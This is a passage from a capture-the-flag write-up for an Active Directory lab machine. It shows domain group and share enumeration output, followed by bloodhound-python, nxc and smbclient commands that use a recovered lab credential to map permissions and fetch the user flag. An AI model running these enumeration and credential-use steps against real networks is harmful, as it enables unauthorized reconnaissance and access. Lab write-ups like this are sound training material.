  groupname: Cert Publishers                                                                                                                                                                                                                
  type: local                                                                                                                                                                                                                               
'518':                                                                                                                                                                                                                                      
  groupname: Schema Admins                                                                                                                                                                                                                  
  type: domain                                                                                                                                                                                                                              
'519':                                                                                                                                                                                                                                      
  groupname: Enterprise Admins                                                                                                                                                                                                              
  type: domain                                                                                                                                                                                                                              
'520':                                                                                                                                                                                                                                      
  groupname: Group Policy Creator Owners                                                                                                                                                                                                    
  type: domain                                                                                                                                                                                                                              
'521':                                                                                                                                                                                                                                      
  groupname: Read-only Domain Controllers                                                                                                                                                                                                   
  type: domain                                                                                                                                                                                                                              
'522':                                                                                                                                                                                                                                      
  groupname: Cloneable Domain Controllers                                                                                                                                                                                                   
  type: domain                                                                                                                                                                                                                              
'525':                                                                                                                                                                                                                                      
  groupname: Protected Users                                                                                                                                                                                                                
  type: domain                                                                                                                                                                                                                              
'526':                                                                                                                                                                                                                                      
  groupname: Key Admins                                                                                                                                                                                                                     
  type: domain                                                                                                                                                                                                                              
'527':                                                                                                                                                                                                                                      
  groupname: Enterprise Key Admins                                                                                                                                                                                                          
  type: domain                                                                                                                                                                                                                              
'544':                                                                                                                                                                                                                                      
  groupname: Administrators                                                                                                                                                                                                                 
  type: builtin                                                                                                                                                                                                                             
'545':                                                                                                                                                                                                                                      
  groupname: Users                                                                                                                                                                                                                          
  type: builtin                                                                                                                                                                                                                             
'546':                                                                                                                                                                                                                                      
  groupname: Guests                                                                                                                                                                                                                         
  type: builtin                                                                                                                                                                                                                             
'548':                                                                                                                                                                                                                                      
  groupname: Account Operators                                                                                                                                                                                                              
  type: builtin                                                                                                                                                                                                                             
'549':                                                                                                                                                                                                                                      
  groupname: Server Operators                                                                                                                                                                                                               
  type: builtin                                                                                                                                                                                                                             
'550':                                                                                                                                                                                                                                      
  groupname: Print Operators                                                                                                                                                                                                                
  type: builtin                                                                                                                                                                                                                             
'551':                                                                                                                                                                                                                                      
  groupname: Backup Operators                                                                                                                                                                                                               
  type: builtin                                                                                                                                                                                                                             
'552':                                                                                                                                                                                                                                      
  groupname: Replicator                                                                                                                                                                                                                     
  type: builtin                                                                                                                                                                                                                             
'553':                                                                                                                                                                                                                                      
  groupname: RAS and IAS Servers                                                                                                                                                                                                            
  type: local                                                                                                                                                                                                                               
'554':                                                                                                                                                                                                                                      
  groupname: Pre-Windows 2000 Compatible Access                                                                                                                                                                                             
  type: builtin                                                                                                                                                                                                                             
'555':                                                                                                                                                                                                                                      
  groupname: Remote Desktop Users                                                                                                                                                                                                           
  type: builtin                                                                                                                                                                                                                             
'556':                                                                                                                                                                                                                                      
  groupname: Network Configuration Operators                                                                                                                                                                                                
  type: builtin                                                                                                                                                                                                                             
'557':                                                                                                                                                                                                                                      
  groupname: Incoming Forest Trust Builders                                                                                                                                                                                                 
  type: builtin                                                                                                                                                                                                                             
'558':                                                                                                                                                                                                                                      
  groupname: Performance Monitor Users                                                                                                                                                                                                      
  type: builtin                                                                                                                                                                                                                             
'559':                                                                                                                                                                                                                                      
  groupname: Performance Log Users                                                                                                                                                                                                          
  type: builtin                                                                                                                                                                                                                             
'560':                                                                                                                                                                                                                                      
  groupname: Windows Authorization Access Group                                                                                                                                                                                             
  type: builtin                                                                                                                                                                                                                             
'561':                                                                                                                                                                                                                                      
  groupname: Terminal Server License Servers                                                                                                                                                                                                
  type: builtin                                                                                                                                                                                                                             
'562':                                                                                                                                                                                                                                      
  groupname: Distributed COM Users                                                                                                                                                                                                          
  type: builtin                                                                                                                                                                                                                             
'568':                                                                                                                                                                                                                                      
  groupname: IIS_IUSRS                                                                                                                                                                                                                      
  type: builtin                                                                                                                                                                                                                             
'569':                                                                                                                                                                                                                                      
  groupname: Cryptographic Operators                                                                                                                                                                                                        
  type: builtin                                                                                                                                                                                                                             
'571':                                                                                                                                                                                                                                      
  groupname: Allowed RODC Password Replication Group                                                                                                                                                                                        
  type: local                                                                                                                                                                                                                               
'572':                                                                                                                                                                                                                                      
  groupname: Denied RODC Password Replication Group                                                                                                                                                                                         
  type: local                                                                                                                                                                                                                               
'573':                                                                                                                                                                                                                                      
  groupname: Event Log Readers                                                                                                                                                                                                              
  type: builtin                                                                                                                                                                                                                             
'574':                                                                                                                                                                                                                                      
  groupname: Certificate Service DCOM Access                                                                                                                                                                                                
  type: builtin                                                                                                                                                                                                                             
'575':                                                                                                                                                                                                                                      
  groupname: RDS Remote Access Servers                                                                                                                                                                                                      
  type: builtin                                                                                                                                                                                                                             
'576':                                                                                                                                                                                                                                      
  groupname: RDS Endpoint Servers                                                                                                                                                                                                           
  type: builtin                                                                                                                                                                                                                             
'577':                                                                                                                                                                                                                                      
  groupname: RDS Management Servers                                                                                                                                                                                                         
  type: builtin                                                                                                                                                                                                                             
'578':                                                                                                                                                                                                                                      
  groupname: Hyper-V Administrators                                                                                                                                                                                                         
  type: builtin                                                                                                                                                                                                                             
'579':                                                                                                                                                                                                                                      
  groupname: Access Control Assistance Operators                                                                                                                                                                                            
  type: builtin                                                                                                                                                                                                                             
'580':                                                                                                                                                                                                                                      
  groupname: Remote Management Users                                                                                                                                                                                                        
  type: builtin                                                                                                                                                                                                                             
'582':                                                                                                                                                                                                                                      
  groupname: Storage Replica Administrators                                                                                                                                                                                                 
  type: builtin                                                                                                                                                                                                                             

 ===================================
|    Shares via RPC on breach.vl    |
 ===================================
[*] Enumerating shares
[+] Found 7 share(s):
ADMIN$:                                                                                                                                                                                                                                     
  comment: Remote Admin                                                                                                                                                                                                                     
  type: Disk                                                                                                                                                                                                                                
C$:                                                                                                                                                                                                                                         
  comment: Default share                                                                                                                                                                                                                    
  type: Disk                                                                                                                                                                                                                                
IPC$:                                                                                                                                                                                                                                       
  comment: Remote IPC                                                                                                                                                                                                                       
  type: IPC                                                                                                                                                                                                                                 
NETLOGON:                                                                                                                                                                                                                                   
  comment: Logon server share                                                                                                                                                                                                               
  type: Disk                                                                                                                                                                                                                                
SYSVOL:                                                                                                                                                                                                                                     
  comment: Logon server share                                                                                                                                                                                                               
  type: Disk                                                                                                                                                                                                                                
Users:                                                                                                                                                                                                                                      
  comment: ''                                                                                                                                                                                                                               
  type: Disk                                                                                                                                                                                                                                
share:                                                                                                                                                                                                                                      
  comment: ''                                                                                                                                                                                                                               
  type: Disk                                                                                                                                                                                                                                
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK
[*] Testing share Users
[+] Mapping: OK, Listing: OK
[*] Testing share share
[+] Mapping: OK, Listing: OK

 ======================================
|    Policies via RPC for breach.vl    |
 ======================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:                                                                                                                                                                                                                
  Password history length: 24                                                                                                                                                                                                               
  Minimum password length: 7                                                                                                                                                                                                                
  Maximum password age: 41 days 23 hours 53 minutes                                                                                                                                                                                         
  Password properties:                                                                                                                                                                                                                      
  - DOMAIN_PASSWORD_COMPLEX: true                                                                                                                                                                                                           
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false                                                                                                                                                                                                   
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false                                                                                                                                                                                                  
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false                                                                                                                                                                                                   
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false                                                                                                                                                                                         
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false                                                                                                                                                                                           
Domain lockout information:                                                                                                                                                                                                                 
  Lockout observation window: 30 minutes                                                                                                                                                                                                    
  Lockout duration: 30 minutes                                                                                                                                                                                                              
  Lockout threshold: None                                                                                                                                                                                                                   
Domain logoff information:                                                                                                                                                                                                                  
  Force logoff time: not set                                                                                                                                                                                                                

 ======================================
|    Printers via RPC for breach.vl    |
 ======================================
[+] No printers available

Completed after 20.85 seconds
</code></pre>
</details>

Now we can see we have a lot more permissions. I'll take note of the users and groups, as well as other interesting information we could gather. I'll use bloodhound-python to collect the data to import it in bloodhound.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/bh]
└─$ bloodhound-python -c all,Group,Session,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL -d "breach.vl" -ns 10.129.8.90 -v -u julia.wong -p 'Computer1'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
DEBUG: Authentication: username/password
DEBUG: Resolved collection methods: dcom, loggedon, trusts, session, localadmin, objectprops, psremote, rdp, container, group, acl
DEBUG: Using DNS to retrieve domain information
DEBUG: Querying domain controller information from DNS
DEBUG: Using domain hint: breach.vl
....
```

SMB wise, I'll check with nxc again.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/bh]
└─$ nxc smb breach.vl -u julia.wong -p 'Computer1' --shares   
SMB         10.129.8.90     445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.8.90     445    BREACHDC         [+] breach.vl\julia.wong:Computer1 
SMB         10.129.8.90     445    BREACHDC         [*] Enumerated shares
SMB         10.129.8.90     445    BREACHDC         Share           Permissions     Remark
SMB         10.129.8.90     445    BREACHDC         -----           -----------     ------
SMB         10.129.8.90     445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.8.90     445    BREACHDC         C$                              Default share
SMB         10.129.8.90     445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.8.90     445    BREACHDC         NETLOGON        READ            Logon server share 
SMB         10.129.8.90     445    BREACHDC         share           READ,WRITE      
SMB         10.129.8.90     445    BREACHDC         SYSVOL          READ            Logon server share 
SMB         10.129.8.90     445    BREACHDC         Users           READ
```

If we go back a little, we had a directory under the name of julia.wong inside `"share"`, I'll check that out.

```bash
smb: \transfer\julia.wong\> ls
  .                                   D        0  Wed Apr 16 20:38:12 2025
  ..                                  D        0  Wed Feb 25 12:49:48 2026
  user.txt                            A       32  Wed Apr 16 20:38:22 2025

                7863807 blocks of size 4096. 1517795 blocks available
smb: \transfer\julia.wong\> 
```

The user.txt is there, we just have to get it and read it.

```bash
smb: \transfer\julia.wong\> get user.txt
getting file \transfer\julia.wong\user.txt of size 32 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \transfer\julia.wong\> exit
```
```bash
┌──(kali㉿kali)-[~/hackthebox/breach/bh]
└─$ cat user.txt 
55d33e....
```

